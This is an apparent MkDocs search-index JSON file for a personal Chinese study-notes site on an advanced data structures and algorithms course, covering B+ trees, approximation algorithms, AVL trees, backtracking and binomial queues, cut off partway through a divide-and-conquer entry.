{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home \u8fd9\u91cc\u662f Chritch|\u514b\u745e\u5947 \uff0c\u6b22\u8fce\u6765\u5230\u6211\u7684\u5b66\u4e60\u6587\u6863 1 :) \u672c\u7b14\u8bb0\u672c\u53c2\u8003\u4e86 TonyCrane \u63d0\u4f9b\u7684\u6a21\u677f \u21a9","title":"Home"},{"location":"#home","text":"\u8fd9\u91cc\u662f Chritch|\u514b\u745e\u5947 \uff0c\u6b22\u8fce\u6765\u5230\u6211\u7684\u5b66\u4e60\u6587\u6863 1 :) \u672c\u7b14\u8bb0\u672c\u53c2\u8003\u4e86 TonyCrane \u63d0\u4f9b\u7684\u6a21\u677f \u21a9","title":"Home"},{"location":"course/","text":"Introduction \u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6574\u7406\u597d\u7684\u8bfe\u7a0b\u7b14\u8bb0","title":"Introduction"},{"location":"course/#introduction","text":"\u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6574\u7406\u597d\u7684\u8bfe\u7a0b\u7b14\u8bb0","title":"Introduction"},{"location":"course/ads/","text":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790(2021-2022\u6625\u590f) Introduction \u4e0a\u7684\u662f\u53f6\u5fb7\u4ed5\u8001\u5e08\u7684\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790\u8bfe\u7a0b\u3002 References \u624b\u5199\u590d\u4e60\u7b14\u8bb0-\u7b97\u6cd5\u90e8\u5206|Carton \u590d\u4e60\u7b14\u8bb0|\u5c0f\u89d2\u9f99 18\u7ea7 \u590d\u4e60\u7b14\u8bb0|JerryG 20\u7ea7","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790(2021-2022\u6625\u590f)"},{"location":"course/ads/#2021-2022","text":"","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790(2021-2022\u6625\u590f)"},{"location":"course/ads/#introduction","text":"\u4e0a\u7684\u662f\u53f6\u5fb7\u4ed5\u8001\u5e08\u7684\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790\u8bfe\u7a0b\u3002","title":"Introduction"},{"location":"course/ads/#references","text":"\u624b\u5199\u590d\u4e60\u7b14\u8bb0-\u7b97\u6cd5\u90e8\u5206|Carton \u590d\u4e60\u7b14\u8bb0|\u5c0f\u89d2\u9f99 18\u7ea7 \u590d\u4e60\u7b14\u8bb0|JerryG 20\u7ea7","title":"References"},{"location":"course/ads/Bplus/","text":"Tips \u548c Database B+ Tree \u662f\u4e00\u4e2a\u539f\u7406\uff0c\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u6570\u636e\u5e93\u91cc\u7684\u7528\u6cd5\u548c\u89c4\u5b9a\u66f4\u52a0\u4e25\u8c28\u3002 B+ Trees Definition A B+ tree of order \\(M\\) is a tree with the following structural properties: The root is either a leaf or has between 2 and M children. All nonleaf nodes (except the root) have between \\(\\lceil M/2 \\rceil\\) and \\(M\\) children. All leaves are at the save depth, have \\(\\lceil \\frac{M}{2}\\rceil\\sim M\\) elements. Apperance Time Complexity \\({\\rm depth} = \\log_{\\lceil M/2 \\rceil}{N} = \\frac{\\log{N}}{\\log{M}}\\) \\({\\rm T} = M \\times {\\rm depth} = M \\log{N} / \\log{M}\\)","title":"Bplus"},{"location":"course/ads/Bplus/#b-trees","text":"","title":"B+ Trees"},{"location":"course/ads/Bplus/#definition","text":"A B+ tree of order \\(M\\) is a tree with the following structural properties: The root is either a leaf or has between 2 and M children. All nonleaf nodes (except the root) have between \\(\\lceil M/2 \\rceil\\) and \\(M\\) children. All leaves are at the save depth, have \\(\\lceil \\frac{M}{2}\\rceil\\sim M\\) elements.","title":"Definition"},{"location":"course/ads/Bplus/#apperance","text":"","title":"Apperance"},{"location":"course/ads/Bplus/#time-complexity","text":"\\({\\rm depth} = \\log_{\\lceil M/2 \\rceil}{N} = \\frac{\\log{N}}{\\log{M}}\\) \\({\\rm T} = M \\times {\\rm depth} = M \\log{N} / \\log{M}\\)","title":"Time Complexity"},{"location":"course/ads/appr/","text":"Approximation Approximation Ratio An algorithm has an approximation ratio of \\(\\rho(n)\\) if, for any input of size \\(n\\) , the cost \\(C\\) of the solution produced by the algorithm is within a factor of \\(\\rho(n)\\) of the cost \\(C^{*}\\) of an optimal solution: \\(max(\\frac{C}{C^{*}}, \\frac{C^*}{C})\\le \\rho(n)\\) If an algorithm achieves an approximation ratio of \\(\\rho(n)\\) , we call it a \\(\\rho(n)-approximation\\ algorithm\\) . polynomial-time approximation scheme(PTAS) An approximation scheme is a polynomial-time approximation scheme if for any fixed \\(\\epsilon > 0\\) , \\(ratio\\le 1+\\epsilon\\) , the scheme runs in time polynomial in the size of its input instance. e.g. \\(O(n^{2/\\epsilon})\\) fully polynomial-time approximation scheme(FPTAS) As a special case of PTAS, the run-time of an FPTAS is polynomial in the problem size and in \\(1/\\epsilon\\) e.g. \\(O((1/\\epsilon)^2n^3)\\) FPTAS\u4e0ePTAS\u7684\u5173\u7cfb\u53ef\u7531\u4e0b\u56fe\u8868\u793a\uff1a Bin Packing Problem Description \u7ed9\u5b9a \\(n\\) \u4e2a\u7269\u54c1\uff0c\u5927\u5c0f\u5747\u57280\uff5e1\u4e4b\u95f4\uff0c\u628a\u5b83\u4eec\u88c5\u8fdb\u82e5\u5e72\u4e2a\u5bb9\u91cf\u5747\u4e3a1\u7684\u7bb1\u5b50\uff0c\u95ee\u5bb9\u7eb3\u5b83\u4eec\u7684\u7bb1\u5b50\u7684\u6700\u5c0f\u6570\u76ee \\(m\\) \u3002 On-line Algorithm On-line Algorithm\u6c38\u8fdc\u4e0d\u53ef\u80fd\u6700\u4f18\uff0c\u53ef\u8bc1\u660e \\(ratio\\ge 5/3\\) Next Fit \u7b97\u6cd5: \u653e\u5728\u5f53\u524d\u7684bin\u4e2d\uff0c\u4e0d\u591f\u5219\u5f00\u65b0\u7684bin \\(ratio = 2\\) First Fit \u7b97\u6cd5: \u5bfb\u627e\u7b2c\u4e00\u4e2a\u53ef\u653e\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin \\(ratio = 1.7\\) Best Fit \u7b97\u6cd5: \u5bfb\u627e\u653e\u5165\u4e4b\u540e\u80fd\u5360\u5f97\u5c3d\u53ef\u80fd\u6ee1\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin \\(ratio=1.7\\) Off-line Algorithm First Fit/Best Fit Decreasing \u7b97\u6cd5: \u6309\u7167\u4ece\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5e8f\uff0c\u7136\u540e\u91c7\u7528First Fit/Best Fit The Knapsack Problem fractional version \u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a \\(M\\) \uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f \\(w_i\\) \uff0c\u4ef7\u503c\u4e3a \\(p_i\\) \u3002\u5141\u8bb8\u628a\u7269\u4f53\u7684 \\(x_i\\) \u6bd4\u4f8b\u88c5\u5165\uff0c\u5229\u76ca\u4e3a \\(x_ip_i\\) \u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002 optimal algorithm: \u9009\u53d6 \\(\\frac{p_i}{w_i}\\) \u6700\u5927\u7684\u5c3d\u53ef\u80fd\u88c5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 0/1 version \u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a \\(M\\) \uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f \\(w_i\\) \uff0c\u4ef7\u503c\u4e3a \\(p_i\\) \u3002\u53ea\u80fd\u9009\u62e9\u88c5\u5165\u6216\u4e0d\u88c5\u5165\uff0c\u88c5\u5165\u5229\u76ca\u4e3a \\(w_ip_i\\) \u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002 NP-hard Problem greedy\u7b97\u6cd5\u7684 \\(ratio=2\\) K-Center Problem Description \u5bf9\u4e8e\u5e73\u9762\u4e0a\u7684 \\(n\\) \u4e2a\u70b9\uff0c\u627e\u51fa\u4e0d\u8d85\u8fc7 \\(k\\) \u4e2a\u5706\u5fc3\u7684\u4f4d\u7f6e\u8986\u76d6\u6240\u6709\u70b9\uff0c\u6c42\u6700\u5c0f\u534a\u5f84 Approximation \u4e00\u4e2a\u7ed3\u8bba\uff1a\u9009\u53d6n\u4e2a\u70b9\u4e2d\u7684\u82e5\u5e72\u70b9\uff0c\u800c\u975e\u9009\u53d6\u5e73\u9762\u4e0a\u7684\u4efb\u610f\u70b9\u3002\u7531\u4e0b\u56fe\u53ef\u77e5\uff0c\u540e\u8005\u7684\u4efb\u610f\u65b9\u6848\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u524d\u8005\u7528 \u4e24\u500d \u7684\u534a\u5f84\u66ff\u4ee3\uff0c\u6545 \\(ratio = 2\\) \u3002 \u5177\u4f53\u7b97\u6cd5\uff1a\u901a\u8fc7\u5bf9\u76ee\u6807\u534a\u5f84 \\(r\\) \u8fdb\u884c\u679a\u4e3e\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728 \\(k\\) \u4e2a\u5706\u5fc3\u7684\u65b9\u6848\uff0c\u4e8c\u5206\u67e5\u627e\u83b7\u5f97\u3002 \u9664\u975e \\(P=NP\\) \uff0c\u5426\u5219K-center\u95ee\u9898\u4e0d\u5b58\u5728\u8fd1\u4f3c\u7387\u5c0f\u4e8e2\u7684\u903c\u8fd1\u7b97\u6cd5","title":"Approximation"},{"location":"course/ads/appr/#approximation","text":"","title":"Approximation"},{"location":"course/ads/appr/#approximation-ratio","text":"An algorithm has an approximation ratio of \\(\\rho(n)\\) if, for any input of size \\(n\\) , the cost \\(C\\) of the solution produced by the algorithm is within a factor of \\(\\rho(n)\\) of the cost \\(C^{*}\\) of an optimal solution: \\(max(\\frac{C}{C^{*}}, \\frac{C^*}{C})\\le \\rho(n)\\) If an algorithm achieves an approximation ratio of \\(\\rho(n)\\) , we call it a \\(\\rho(n)-approximation\\ algorithm\\) .","title":"Approximation Ratio"},{"location":"course/ads/appr/#polynomial-time-approximation-schemeptas","text":"An approximation scheme is a polynomial-time approximation scheme if for any fixed \\(\\epsilon > 0\\) , \\(ratio\\le 1+\\epsilon\\) , the scheme runs in time polynomial in the size of its input instance. e.g. \\(O(n^{2/\\epsilon})\\)","title":"polynomial-time approximation scheme(PTAS)"},{"location":"course/ads/appr/#fully-polynomial-time-approximation-schemefptas","text":"As a special case of PTAS, the run-time of an FPTAS is polynomial in the problem size and in \\(1/\\epsilon\\) e.g. \\(O((1/\\epsilon)^2n^3)\\) FPTAS\u4e0ePTAS\u7684\u5173\u7cfb\u53ef\u7531\u4e0b\u56fe\u8868\u793a\uff1a","title":"fully polynomial-time approximation scheme(FPTAS)"},{"location":"course/ads/appr/#bin-packing-problem","text":"","title":"Bin Packing Problem"},{"location":"course/ads/appr/#description","text":"\u7ed9\u5b9a \\(n\\) \u4e2a\u7269\u54c1\uff0c\u5927\u5c0f\u5747\u57280\uff5e1\u4e4b\u95f4\uff0c\u628a\u5b83\u4eec\u88c5\u8fdb\u82e5\u5e72\u4e2a\u5bb9\u91cf\u5747\u4e3a1\u7684\u7bb1\u5b50\uff0c\u95ee\u5bb9\u7eb3\u5b83\u4eec\u7684\u7bb1\u5b50\u7684\u6700\u5c0f\u6570\u76ee \\(m\\) \u3002","title":"Description"},{"location":"course/ads/appr/#on-line-algorithm","text":"On-line Algorithm\u6c38\u8fdc\u4e0d\u53ef\u80fd\u6700\u4f18\uff0c\u53ef\u8bc1\u660e \\(ratio\\ge 5/3\\) Next Fit \u7b97\u6cd5: \u653e\u5728\u5f53\u524d\u7684bin\u4e2d\uff0c\u4e0d\u591f\u5219\u5f00\u65b0\u7684bin \\(ratio = 2\\) First Fit \u7b97\u6cd5: \u5bfb\u627e\u7b2c\u4e00\u4e2a\u53ef\u653e\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin \\(ratio = 1.7\\) Best Fit \u7b97\u6cd5: \u5bfb\u627e\u653e\u5165\u4e4b\u540e\u80fd\u5360\u5f97\u5c3d\u53ef\u80fd\u6ee1\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin \\(ratio=1.7\\)","title":"On-line Algorithm"},{"location":"course/ads/appr/#off-line-algorithm","text":"First Fit/Best Fit Decreasing \u7b97\u6cd5: \u6309\u7167\u4ece\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5e8f\uff0c\u7136\u540e\u91c7\u7528First Fit/Best Fit","title":"Off-line Algorithm"},{"location":"course/ads/appr/#the-knapsack-problem","text":"","title":"The Knapsack Problem"},{"location":"course/ads/appr/#fractional-version","text":"\u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a \\(M\\) \uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f \\(w_i\\) \uff0c\u4ef7\u503c\u4e3a \\(p_i\\) \u3002\u5141\u8bb8\u628a\u7269\u4f53\u7684 \\(x_i\\) \u6bd4\u4f8b\u88c5\u5165\uff0c\u5229\u76ca\u4e3a \\(x_ip_i\\) \u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002 optimal algorithm: \u9009\u53d6 \\(\\frac{p_i}{w_i}\\) \u6700\u5927\u7684\u5c3d\u53ef\u80fd\u88c5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002","title":"fractional version"},{"location":"course/ads/appr/#01-version","text":"\u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a \\(M\\) \uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f \\(w_i\\) \uff0c\u4ef7\u503c\u4e3a \\(p_i\\) \u3002\u53ea\u80fd\u9009\u62e9\u88c5\u5165\u6216\u4e0d\u88c5\u5165\uff0c\u88c5\u5165\u5229\u76ca\u4e3a \\(w_ip_i\\) \u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002 NP-hard Problem greedy\u7b97\u6cd5\u7684 \\(ratio=2\\)","title":"0/1 version"},{"location":"course/ads/appr/#k-center-problem","text":"","title":"K-Center Problem"},{"location":"course/ads/appr/#description_1","text":"\u5bf9\u4e8e\u5e73\u9762\u4e0a\u7684 \\(n\\) \u4e2a\u70b9\uff0c\u627e\u51fa\u4e0d\u8d85\u8fc7 \\(k\\) \u4e2a\u5706\u5fc3\u7684\u4f4d\u7f6e\u8986\u76d6\u6240\u6709\u70b9\uff0c\u6c42\u6700\u5c0f\u534a\u5f84","title":"Description"},{"location":"course/ads/appr/#approximation_1","text":"\u4e00\u4e2a\u7ed3\u8bba\uff1a\u9009\u53d6n\u4e2a\u70b9\u4e2d\u7684\u82e5\u5e72\u70b9\uff0c\u800c\u975e\u9009\u53d6\u5e73\u9762\u4e0a\u7684\u4efb\u610f\u70b9\u3002\u7531\u4e0b\u56fe\u53ef\u77e5\uff0c\u540e\u8005\u7684\u4efb\u610f\u65b9\u6848\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u524d\u8005\u7528 \u4e24\u500d \u7684\u534a\u5f84\u66ff\u4ee3\uff0c\u6545 \\(ratio = 2\\) \u3002 \u5177\u4f53\u7b97\u6cd5\uff1a\u901a\u8fc7\u5bf9\u76ee\u6807\u534a\u5f84 \\(r\\) \u8fdb\u884c\u679a\u4e3e\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728 \\(k\\) \u4e2a\u5706\u5fc3\u7684\u65b9\u6848\uff0c\u4e8c\u5206\u67e5\u627e\u83b7\u5f97\u3002 \u9664\u975e \\(P=NP\\) \uff0c\u5426\u5219K-center\u95ee\u9898\u4e0d\u5b58\u5728\u8fd1\u4f3c\u7387\u5c0f\u4e8e2\u7684\u903c\u8fd1\u7b97\u6cd5","title":"Approximation"},{"location":"course/ads/avl/","text":"AVL Trees Adelson-Velskii-Landis[AVL] Trees Definition The balance factor BF(node) = \\(h_L - h_R\\) . In an AVL Tree, BF(node) = -1, 0, 1. Different Trees Perfect Binary Tree Complete Binary Tree Full Binary Tree: has two leaf nodes or not. e.g. Huffman Tree Rotation LL Rotation/RR Rotation Two Single Rotation LR Rotation/RL Rotation Double Rotation Analysis Let \\(n_h\\) be the minimum number of nodes in a height balanced tree of height \\(h\\) \\[ \\begin{aligned} n_h &= n_{h-1} + n_{h-2} + 1\\\\ (n_h + 1) &=(n_{h-1}+1)+(n_{h-2}+1)\\\\ F_h &= F_{h-1} + F_{h}\\ [F_{h+2} = n_h + 1,F_3=2=n_1+1]\\\\ F_h&\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^h\\\\ n_h&\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^{h+2}-1\\\\ h&=O(\\ln{n}) \\end{aligned} \\]","title":"AVL Trees"},{"location":"course/ads/avl/#avl-trees","text":"Adelson-Velskii-Landis[AVL] Trees","title":"AVL Trees"},{"location":"course/ads/avl/#definition","text":"The balance factor BF(node) = \\(h_L - h_R\\) . In an AVL Tree, BF(node) = -1, 0, 1.","title":"Definition"},{"location":"course/ads/avl/#different-trees","text":"Perfect Binary Tree Complete Binary Tree Full Binary Tree: has two leaf nodes or not. e.g. Huffman Tree","title":"Different Trees"},{"location":"course/ads/avl/#rotation","text":"LL Rotation/RR Rotation Two Single Rotation LR Rotation/RL Rotation Double Rotation","title":"Rotation"},{"location":"course/ads/avl/#analysis","text":"Let \\(n_h\\) be the minimum number of nodes in a height balanced tree of height \\(h\\) \\[ \\begin{aligned} n_h &= n_{h-1} + n_{h-2} + 1\\\\ (n_h + 1) &=(n_{h-1}+1)+(n_{h-2}+1)\\\\ F_h &= F_{h-1} + F_{h}\\ [F_{h+2} = n_h + 1,F_3=2=n_1+1]\\\\ F_h&\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^h\\\\ n_h&\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^{h+2}-1\\\\ h&=O(\\ln{n}) \\end{aligned} \\]","title":"Analysis"},{"location":"course/ads/back/","text":"Backtracking Definition Backtracking enables us to eliminate the explicit examination of a large subset of the candidates while still guaranteeing that the answer will be found if the algorithm is run to termination. \u516b\u7687\u540e\u95ee\u9898 \u95ee\u9898: \u5728\u68cb\u76d8\u4e2d\u627e\u5230\u516b\u4e2a\u4f4d\u7f6e\u653e\u7f6e\u7687\u540e\uff0c\u4f7f\u5f97\u5b83\u4eec\u90fd\u4e0d\u540c\u884c\u4e14\u4e0d\u540c\u5217\uff0c\u4e5f\u4e0d\u80fd\u540c\u65f6\u4f4d\u4e8e\u5bf9\u89d2\u7ebf\u4e0a The Turnpike Reconstruction Problem \u95ee\u9898\uff1a\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\u627e\u5230n\u4e2a\u5730\u65b9\u5efa\u7acb\u52a0\u6cb9\u7ad9\uff0c\u5df2\u77e5\u5b83\u4eec\u4e24\u4e24\u4e4b\u95f4\u7684\u8ddd\u79bb( \\(N(N-2)/2\\) \u7ec4)\uff0c\u6c42\u51fa\u6240\u6709\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\uff0c\u5047\u5b9a\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u5750\u6807\u662f0 \u7b97\u6cd5\u6d41\u7a0b \u5148\u5c06\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u548c\u6700\u540e\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\u786e\u5b9a\uff0c\u5e76\u5c06\u5df2\u7ecf\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\u4ece\u8def\u5f84\u4e2d\u5220\u9664 \u627e\u5230\u5269\u4e0b\u7684\u8ddd\u79bb\u4e2d\u6700\u5927\u7684\u8ddd\u79bb\u5e76\u68c0\u9a8c\uff0c\u4e0d\u65ad\u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u5982\u679c\u68c0\u9a8c\u5931\u8d25\u5219\u56de\u5230\u4e0a\u4e00\u79cd\u60c5\u51b5\uff0c\u6062\u590d\u539f\u672c\u88ab\u5220\u9664\u7684\u8ddd\u79bb\u518d\u5f80\u4e0b\u56de\u6eaf \\(\\alpha-\\beta\\) \u526a\u679d Minimax Strategy \u5728\u4eba\u673a\u5bf9\u5f08\u7684\u65f6\u5019 \u4eba\u9700\u8981\u6700\u5c0f\u5316\u5f53\u524d\u60c5\u51b5P\u7684\u53ef\u80fd\u8d62\u7684\u60c5\u51b5\uff0c\u800cAI\u8981\u5c06\u5b83\u6700\u5927\u5316 goodness\u51fd\u6570 \\(f(P)=W_{AI}-W_{Human}\\) \uff0cW\u662f\u5f53\u524d\u60c5\u51b5\u4e0b\u67d0\u4e00\u65b9\u53ef\u80fd\u8d62\u7684\u6240\u6709\u7ed3\u679c\uff0c\u4e0d\u9700\u8981\u8003\u8651\u53e6\u4e00\u65b9\u540e\u9762\u4f1a\u600e\u4e48\u4e0b\uff0c\u53ea\u8981\u8ba1\u7b97\u81ea\u5df1\u5728\u5f53\u524d\u5c40\u52bf\u4e0b\u7684\u4efb\u4f55\u53ef\u4ee5\u8d62\u7684\u65b9 \u526a\u679d\u7b56\u7565 \u03b1\u526a\u679d\uff1amin\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00min\u5c42\u4e2d\u7684\u6700\u5927\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmax\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002 \u03b2\u526a\u679d\uff1amax\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00max\u5c42\u4e2d\u7684\u6700\u5c0f\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmin\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002","title":"Backtracking"},{"location":"course/ads/back/#backtracking","text":"","title":"Backtracking"},{"location":"course/ads/back/#definition","text":"Backtracking enables us to eliminate the explicit examination of a large subset of the candidates while still guaranteeing that the answer will be found if the algorithm is run to termination.","title":"Definition"},{"location":"course/ads/back/#_1","text":"\u95ee\u9898: \u5728\u68cb\u76d8\u4e2d\u627e\u5230\u516b\u4e2a\u4f4d\u7f6e\u653e\u7f6e\u7687\u540e\uff0c\u4f7f\u5f97\u5b83\u4eec\u90fd\u4e0d\u540c\u884c\u4e14\u4e0d\u540c\u5217\uff0c\u4e5f\u4e0d\u80fd\u540c\u65f6\u4f4d\u4e8e\u5bf9\u89d2\u7ebf\u4e0a","title":"\u516b\u7687\u540e\u95ee\u9898"},{"location":"course/ads/back/#the-turnpike-reconstruction-problem","text":"\u95ee\u9898\uff1a\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\u627e\u5230n\u4e2a\u5730\u65b9\u5efa\u7acb\u52a0\u6cb9\u7ad9\uff0c\u5df2\u77e5\u5b83\u4eec\u4e24\u4e24\u4e4b\u95f4\u7684\u8ddd\u79bb( \\(N(N-2)/2\\) \u7ec4)\uff0c\u6c42\u51fa\u6240\u6709\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\uff0c\u5047\u5b9a\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u5750\u6807\u662f0 \u7b97\u6cd5\u6d41\u7a0b \u5148\u5c06\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u548c\u6700\u540e\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\u786e\u5b9a\uff0c\u5e76\u5c06\u5df2\u7ecf\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\u4ece\u8def\u5f84\u4e2d\u5220\u9664 \u627e\u5230\u5269\u4e0b\u7684\u8ddd\u79bb\u4e2d\u6700\u5927\u7684\u8ddd\u79bb\u5e76\u68c0\u9a8c\uff0c\u4e0d\u65ad\u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u5982\u679c\u68c0\u9a8c\u5931\u8d25\u5219\u56de\u5230\u4e0a\u4e00\u79cd\u60c5\u51b5\uff0c\u6062\u590d\u539f\u672c\u88ab\u5220\u9664\u7684\u8ddd\u79bb\u518d\u5f80\u4e0b\u56de\u6eaf","title":"The Turnpike Reconstruction Problem"},{"location":"course/ads/back/#alpha-beta","text":"","title":"\\(\\alpha-\\beta\\) \u526a\u679d"},{"location":"course/ads/back/#minimax-strategy","text":"\u5728\u4eba\u673a\u5bf9\u5f08\u7684\u65f6\u5019 \u4eba\u9700\u8981\u6700\u5c0f\u5316\u5f53\u524d\u60c5\u51b5P\u7684\u53ef\u80fd\u8d62\u7684\u60c5\u51b5\uff0c\u800cAI\u8981\u5c06\u5b83\u6700\u5927\u5316 goodness\u51fd\u6570 \\(f(P)=W_{AI}-W_{Human}\\) \uff0cW\u662f\u5f53\u524d\u60c5\u51b5\u4e0b\u67d0\u4e00\u65b9\u53ef\u80fd\u8d62\u7684\u6240\u6709\u7ed3\u679c\uff0c\u4e0d\u9700\u8981\u8003\u8651\u53e6\u4e00\u65b9\u540e\u9762\u4f1a\u600e\u4e48\u4e0b\uff0c\u53ea\u8981\u8ba1\u7b97\u81ea\u5df1\u5728\u5f53\u524d\u5c40\u52bf\u4e0b\u7684\u4efb\u4f55\u53ef\u4ee5\u8d62\u7684\u65b9","title":"Minimax Strategy"},{"location":"course/ads/back/#_2","text":"\u03b1\u526a\u679d\uff1amin\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00min\u5c42\u4e2d\u7684\u6700\u5927\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmax\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002 \u03b2\u526a\u679d\uff1amax\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00max\u5c42\u4e2d\u7684\u6700\u5c0f\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmin\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002","title":"\u526a\u679d\u7b56\u7565"},{"location":"course/ads/bin/","text":"Binomial Queue Definition Character for \\(B_k\\) has exactly \\(2^k\\) nodes the number of nodes at depth \\(d\\) is \\(\\binom{k}{d}\\) for a priority queue of size \\(13\\) \\(13 = 2^0 + 0\\times 2^1 + 2^2 + 2^3 = 1101_2\\) A binomial queue of \\(N\\) elements can be built by \\(N\\) sccessive insertions in \\(O(N)\\) time. Operation FindMin There are at most \\(\\lceil \\log{N}\\rceil\\) roots, hence \\(T_p = O(\\log{N})\\) Merge \\(T_p = O(\\log{N})\\) DeleteMin \\(T_p=O(\\log{N})\\) Decreased Key \\(T_p=O(\\log{N})\\)","title":"Binomial Queue"},{"location":"course/ads/bin/#binomial-queue","text":"","title":"Binomial Queue"},{"location":"course/ads/bin/#definition","text":"","title":"Definition"},{"location":"course/ads/bin/#character","text":"for \\(B_k\\) has exactly \\(2^k\\) nodes the number of nodes at depth \\(d\\) is \\(\\binom{k}{d}\\) for a priority queue of size \\(13\\) \\(13 = 2^0 + 0\\times 2^1 + 2^2 + 2^3 = 1101_2\\) A binomial queue of \\(N\\) elements can be built by \\(N\\) sccessive insertions in \\(O(N)\\) time.","title":"Character"},{"location":"course/ads/bin/#operation","text":"","title":"Operation"},{"location":"course/ads/bin/#findmin","text":"There are at most \\(\\lceil \\log{N}\\rceil\\) roots, hence \\(T_p = O(\\log{N})\\)","title":"FindMin"},{"location":"course/ads/bin/#merge","text":"\\(T_p = O(\\log{N})\\)","title":"Merge"},{"location":"course/ads/bin/#deletemin","text":"\\(T_p=O(\\log{N})\\)","title":"DeleteMin"},{"location":"course/ads/bin/#decreased-key","text":"\\(T_p=O(\\log{N})\\)","title":"Decreased Key"},{"location":"course/ads/divide/","text":"Divide and Conquer Recursive tree Master Theory Form1 The recurrence \\(T(N) = aT(N/b) + f(N)\\) can be solved as follows: If \\(af(N/b) = Kf(N)\\) for some constant \\(K<1\\) , then \\(T(N)=\\Theta(f(N))\\) If \\(af(N/b) = 